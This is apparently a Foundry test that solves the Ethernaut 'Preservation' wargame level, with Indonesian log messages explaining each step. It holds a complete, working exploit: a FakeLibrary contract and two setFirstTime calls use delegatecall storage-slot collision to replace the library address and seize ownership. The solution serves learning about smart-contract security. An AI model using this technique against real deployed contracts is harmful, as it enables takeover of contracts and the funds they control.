// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../17-Preservation/PreservationFactory.sol";
import "forge-std/Test.sol";

contract PreservationAttack is Test {
    function testPreservation() external {
        vm.createSelectFork(vm.envString("sepolia"));
        address penipu = makeAddr("penipu");
        Ethernaut ethernaut = new Ethernaut();
        PreservationFactory factory = new PreservationFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(penipu, penipu);
        address addr = ethernaut.createLevelInstance(factory);
        Preservation preservation = Preservation(addr);
        bool bukanOwner = preservation.owner() != penipu;
        assertTrue(bukanOwner);
        emit log("Setup done!\nGoal: ambil alih kepemilikan");
        emit log("jika dilihat codenya, contract library dapat mengubah state variable");
        emit log(
            "dengan kata lain, jika kita bisa mengganti contract yang didelegasikan dengan contract milik kita, kita dapat mengubah owner"
        );
        emit log("liat variable owner ada di slot 2");
        emit log(
            "variable storedTime pada library berada di slot 0, sama seperti address timeZone1Library. Ini bisa digunakan untuk mengambil alih library"
        );
        emit log("address memiliki panjang 20bytes, maka jika hendak diubah ke uint256, harus diubah dulu ke uint160");
        FakeLibrary fake = new FakeLibrary();
        preservation.setFirstTime(uint160(address(fake)));
        emit log("library telah diambil alih");
        preservation.setFirstTime(uint160(address(penipu)));
        bool sukses = ethernaut.submitLevelInstance(payable(addr));
        assertTrue(sukses);
        emit log("hati-hati menggunakan library yang dapat mengubah state variable");
    }
}

contract FakeLibrary {
    address a;
    address b;
    address owner;

    function setTime(uint256 _owner) external {
        owner = address(uint160(_owner));
    }
}
